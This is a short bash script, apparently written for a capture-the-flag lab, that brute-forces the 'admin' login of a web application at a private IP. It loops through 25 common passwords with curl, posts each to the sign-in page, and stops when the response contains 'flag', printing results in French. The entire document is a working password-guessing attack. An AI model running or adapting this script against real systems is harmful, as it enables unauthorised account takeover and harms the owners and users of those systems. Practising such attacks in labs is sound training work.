#!/bin/bash

passwords=(123456 password 12345678 qwerty abc123 123456789 111111 1234567 iloveyou adobe123 123123 Admin 1234567890 letmein photoshop 1234 monkey shadow sunshine 12345 password1 princess azerty trustno1 000000)

for i in "${passwords[@]}"; do
    response=$(curl -s -X POST "http://192.168.56.101/index.php?page=signin&username=admin&password=${i}&Login=Login#")
    if echo "$response" | grep -q "flag"; then
        echo "✅ Le mot de passe est : $i"
        echo "$response" | grep "flag"
        break
    else
        echo "❌ Échec avec : $i"
    fi
done
